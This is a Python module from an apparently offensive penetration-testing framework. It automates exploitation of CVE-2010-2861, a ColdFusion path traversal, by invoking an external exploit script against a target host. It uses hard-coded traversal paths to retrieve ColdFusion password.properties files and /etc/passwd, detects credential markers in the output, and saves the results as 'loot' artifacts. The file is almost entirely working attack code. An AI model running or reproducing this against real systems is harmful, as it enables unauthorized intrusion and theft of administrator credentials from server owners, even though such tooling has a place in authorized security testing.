def run(data, cred, args):
    import subprocess
    from core.target import get_current_url
    from core.paths import get_artifacts_dir, get_tools_dir

    # --- CORE PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    target_url = get_current_url(data)
    target_name = data.get("name", "unknown")

    if not target_url:
        print(f"{R}[!] PHASE: ABORTED. No target URL found.{W}")
        return data

    # Normalize host/port
    clean_target = target_url.split("://")[1] if "://" in target_url else target_url
    host, port = clean_target.split(":") if ":" in clean_target else (clean_target, "80")

    # 1. PHASE HEADER
    print(f"\n{B}[*]{W} {BOLD}PHASE: LFI EXFILTRATION (CVE-2010-2861){W}")
    print(f"{B}  ├── {B}Target:{W}   {C}{host}:{port}{W}")
    print(f"{B}  └── {B}Artifacts:{W} {artifact_dir if 'artifact_dir' in locals() else 'Standard Storage'}")

    exploit = get_tools_dir() / "cves" / "cve_2010_2861.py"
    if not exploit.exists():
        print(f"{R}  └── [!] ERROR: Exploit script missing at {exploit}{W}")
        return data

    files = [
        "../../../../../../../../ColdFusion8/lib/password.properties",
        "../../../../../../../../ColdFusion9/lib/password.properties",
        "../../../../../../../../etc/passwd",
    ]

    artifact_dir = get_artifacts_dir(target_name) / "coldfusion_traversal"
    artifact_dir.mkdir(parents=True, exist_ok=True)
    found_any = False

    for f in files:
        print(f"\n{B}[*]{W} Attempting recovery: {BOLD}{f}{W}")
        
        cmd = ["python2", str(exploit), host, port, f]
        
        # 2. COMMAND TRANSPARENCY
        print(f"{B}  └── {B}Command:{W} {Y}{' '.join(cmd)}{W}")

        try:
            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout.strip()

            if not output:
                print(f"{R}      └── [-] No data returned{W}")
                continue

            cleaned = "\n".join([
                line for line in output.splitlines()
                if not any(x in line.lower() for x in ["trying", "title from server"])
            ]).strip()

            # 3. SUCCESS BRANCHING & LOOT BOX
            if any(x in cleaned for x in ["password=", "encrypted=", "root:x:"]):
                found_any = True
                safe_name = f.replace("/", "_").replace(".", "")
                outfile = artifact_dir / safe_name
                
                with open(outfile, "w") as out:
                    out.write(cleaned)

                print(f"{G}      └── [+] SUCCESS: {f} exfiltrated{W}")

                # --- THE LOOT BOX ---
                box_width = 70
                print(f"\n{G}┌── DATA RECOVERY: {f.split('/')[-1].upper()} ──────────────────────────┐{W}")
                for line in cleaned.splitlines()[:10]: # Snippet first 10 lines
                    print(f"{G}│{W}  {line:<{box_width-4}} {G}│{W}")
                if len(cleaned.splitlines()) > 10:
                    print(f"{G}│{W}  {DIM}... (truncated, see artifacts for full file) ...{W:<{box_width-4}} {G}│{W}")
                print(f"{G}└──────────────────────────────────────────────────────────────────────┘{W}")
                print(f"{B}  [i] Artifact saved to: {W}{outfile}")

            else:
                print(f"{R}      └── [-] Filtered output contains no secrets{W}")

        except Exception as e:
            print(f"{R}      └── [!] Subprocess Error: {e}{W}")

    if not found_any:
        print(f"\n{R}[!] STATUS: OPERATION FAILED. No files recovered.{W}\n")
    else:
        print(f"\n{G}[+] STATUS: OPERATION COMPLETE. Review collected artifacts.{W}\n")

    return data